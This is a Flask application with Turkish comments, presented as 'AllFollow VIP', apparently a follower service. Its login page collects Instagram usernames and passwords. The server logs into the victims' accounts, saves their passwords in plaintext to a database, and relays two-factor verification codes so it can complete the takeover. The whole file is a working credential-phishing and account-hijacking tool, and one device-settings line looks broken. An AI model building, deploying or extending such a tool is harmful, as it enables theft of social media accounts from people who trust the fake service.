import os
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, ProxyError
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# PROXY SORUN ÇIKARABİLİR, ŞİMDİLİK NONE YAPIYORUZ
PROXY_URL = None 

active_sessions = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def login_api():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    
    # Cihaz ayarlarını rastgele yap (Giriş ihtimalini artırır)
    cl.set_device_settings(cl.delay_range == [2, 4])
    
    if PROXY_URL:
        cl.set_proxy(PROXY_URL)
    
    active_sessions[u] = cl
    
    try:
        print(f"DEBUG: {u} giriş denemesi yapılıyor...")
        if cl.login(u, p):
            acc = IGAccount.query.filter_by(username=u).first()
            if not acc:
                acc = IGAccount(username=u, password=p, status="AKTIF")
                db.session.add(acc)
            else:
                acc.status = "AKTIF"
            db.session.commit()
            return jsonify(status="success", next_step="dashboard")
            
    except BadPassword:
        return jsonify(status="error", message="Şifre Yanlış! (Lütfen büyük/küçük harfe dikkat edin)")
    except ChallengeRequired:
        return jsonify(status="challenge", next_step="verify")
    except Exception as e:
        # Hatanın gerçek sebebini terminale yazdıralım
        err_msg = str(e)
        print(f"KRITIK HATA: {err_msg}")
        if "checkpoint" in err_msg.lower():
            return jsonify(status="challenge", next_step="verify")
        return jsonify(status="error", message="Instagram Erişimi Engelledi (IP Block). Lütfen biraz bekleyip tekrar deneyin.")

@app.route('/api/verify', methods=['POST'])
def verify_api():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = active_sessions.get(u)
    if not cl: return jsonify(status="error", message="Oturum Yok")
    try:
        cl.challenge_set_code(code)
        acc = IGAccount.query.filter_by(username=u).first()
        if acc:
            acc.status = "AKTIF"
            db.session.commit()
        return jsonify(status="success", next_step="dashboard")
    except Exception as e:
        return jsonify(status="error", message="Kod Doğrulanamadı: " + str(e))

# --- UI TARAFI ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow VIP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #09090b; color: white; font-family: sans-serif; }
        .glass { background: rgba(24, 24, 27, 0.9); border: 1px solid rgba(63, 63, 70, 0.5); backdrop-filter: blur(10px); }
        .page { display: none; } .active { display: block; }
        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #a855f7; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div id="login-page" class="page active w-full max-w-[350px]">
        <div class="glass p-8 rounded-3xl text-center shadow-2xl">
            <h1 class="text-3xl font-black italic mb-6 text-purple-500">ALLFOLLOW</h1>
            <div class="space-y-4 text-left">
                <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-black border border-zinc-800 p-3 rounded-xl outline-none focus:border-purple-500 text-sm">
                <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-zinc-800 p-3 rounded-xl outline-none focus:border-purple-500 text-sm">
                <button onclick="handleLogin()" id="login-btn" class="w-full bg-purple-600 font-bold py-3 rounded-xl">GİRİŞ YAP</button>
            </div>
            <p id="err" class="text-red-500 text-[11px] mt-4 font-bold text-center"></p>
        </div>
    </div>

    <div id="verify-page" class="page w-full max-w-[350px]">
        <div class="glass p-8 rounded-3xl text-center border-amber-500/50">
            <h2 class="text-xl font-bold mb-4 text-amber-500 text-center">Doğrulama Gerekli</h2>
            <input id="vcode" placeholder="000000" class="w-full bg-black border border-zinc-800 p-4 rounded-xl text-center text-2xl tracking-widest outline-none mb-4">
            <button onclick="handleVerify()" id="verify-btn" class="w-full bg-amber-600 font-bold py-3 rounded-xl text-center">ONAYLA</button>
        </div>
    </div>

    <div id="dashboard-page" class="page w-full max-w-[400px]">
        <div class="glass p-8 rounded-3xl border-t-4 border-green-500 shadow-2xl text-center">
            <h2 class="text-2xl font-black text-green-500 mb-2">Giriş Başarılı ✅</h2>
            <p id="final-user" class="text-white font-bold mb-6 text-center"></p>
            <div class="grid grid-cols-1 gap-2">
                <button class="p-4 bg-zinc-900 rounded-2xl border border-zinc-800 font-bold text-center">PANELİ KULLANMAYA BAŞLA</button>
            </div>
        </div>
    </div>

    <script>
        async function handleLogin() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const btn = document.getElementById('login-btn');
            const err = document.getElementById('err');
            if(!u || !p) return;
            btn.disabled = true;
            btn.innerHTML = '<div class="loader"></div> BAĞLANIYOR...';
            err.innerText = "";
            
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                if(d.status === "success") {
                    showPage('dashboard-page');
                    document.getElementById('final-user').innerText = "@" + u;
                } else if(d.status === "challenge") {
                    showPage('verify-page');
                } else {
                    err.innerText = d.message;
                    btn.disabled = false;
                    btn.innerText = "GİRİŞ YAP";
                }
            } catch (e) {
                err.innerText = "Sunucu hatası!";
                btn.disabled = false;
            }
        }

        async function handleVerify() {
            const code = document.getElementById('vcode').value;
            const u = document.getElementById('u').value;
            const btn = document.getElementById('verify-btn');
            btn.disabled = true;
            btn.innerText = "ONAYLANIYOR...";
            const r = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, code})
            });
            const d = await r.json();
            if(d.status === "success") {
                showPage('dashboard-page');
                document.getElementById('final-user').innerText = "@" + u;
            } else {
                alert(d.message);
                btn.disabled = false;
                btn.innerText = "ONAYLA";
            }
        }

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
